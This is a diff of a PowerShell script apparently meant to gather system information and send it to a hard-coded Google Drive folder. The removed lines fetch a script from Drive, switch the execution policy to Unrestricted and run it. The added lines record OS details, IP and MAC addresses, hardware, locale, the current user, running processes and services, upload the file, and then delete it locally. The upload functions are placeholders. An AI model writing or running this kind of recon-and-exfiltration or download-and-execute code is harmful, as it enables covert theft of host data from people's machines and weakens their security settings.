@@ -1,44 +1,31 @@
 # Google Drive Configuration (Replace with your actual details)
-$googleDriveFolderId = "https://drive.google.com/drive/u/0/folders/1IlASN8C4ocFjCmLwagRQxagDHwb9ZbNx" 
-$scriptFileId = "https://drive.google.com/file/d/1Huybhepaau4RKx2yrKdKDzPDTq4-Ba-i/view?usp=sharing"
+$googleDriveFolderId = "https://drive.google.com/drive/folders/1IlASN8C4ocFjCmLwagRQxagDHwb9ZbNx?usp=drive_link" 
 
-# Local Paths
-$downloadedFilePath = "$env:USERPROFILE\Downloads\Gather_Info.ps1"
-$destinationPath = "C:\Users\SimonWukits\Documents\Gather_Info.ps1"
-$resultFilePath = "$env:USERPROFILE\Documents\system_info.txt" # Update this with the actual path
+# Output File Path
+$outputFilePath = "$env:USERPROFILE\Downloads\output_filename.txt"
 
-# Download the Script from Google Drive
-try {
-    # Implement your Google Drive download logic here
-    # Example (using a hypothetical function):
-    Download-FileFromGoogleDrive -FileId $scriptFileId -DestinationPath $downloadedFilePath
-} catch {
-    Write-Error "Error downloading script from Google Drive: $($_.Exception.Message)"
-    exit 1 
-}
-
-# Copy the Script to the Execution Location
-Copy-Item -Path $downloadedFilePath -Destination $destinationPath -Force
-
-# Check and Adjust Execution Policy (if necessary)
-$executionPolicy = Get-ExecutionPolicy
-if ($executionPolicy -eq "Restricted") {
-    Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser -Force
-    Write-Host "Execution policy changed to Unrestricted for the current user."
-}
-
-# Execute the Downloaded Script
-try {
-    & $destinationPath
-} catch {
-    Write-Error "Error executing the downloaded script: $($_.Exception.Message)"
-}
+# Gather System Information
+Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsName, OsManufacturer, CsName | Out-File -FilePath $outputFilePath
+Get-NetIPAddress | Select-Object InterfaceAlias, IPAddress, PrefixLength >> $outputFilePath
+Get-NetAdapter | Select-Object Name, InterfaceDescription, MacAddress, Status >> $outputFilePath
+Get-WmiObject -Class Win32_Processor | Select-Object Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors >> $outputFilePath
+Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object Sum >> $outputFilePath
+Get-WmiObject -Class Win32_DiskDrive | Select-Object Model, Size, MediaType >> $outputFilePath
+Get-WinHomeLocation >> $outputFilePath
+Get-WinSystemLocale >> $outputFilePath
+$currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()) >> $outputFilePath
+$currentUser.Identity.Name >> $outputFilePath
+Get-Process >> $outputFilePath
+Get-Service >> $outputFilePath
 
 # Upload the Results to Google Drive
 try {
     # Implement your Google Drive upload logic here
     # Example (using a hypothetical function):
-    Upload-FileToGoogleDrive -FilePath $resultFilePath -FolderId $googleDriveFolderId
+    Upload-FileToGoogleDrive -FilePath $outputFilePath -FolderId $googleDriveFolderId
 } catch {
     Write-Error "Error uploading results to Google Drive: $($_.Exception.Message)"
+} finally {
+    # Delete the output file after upload (successful or not)
+    Remove-Item -Path $outputFilePath -Force
 }
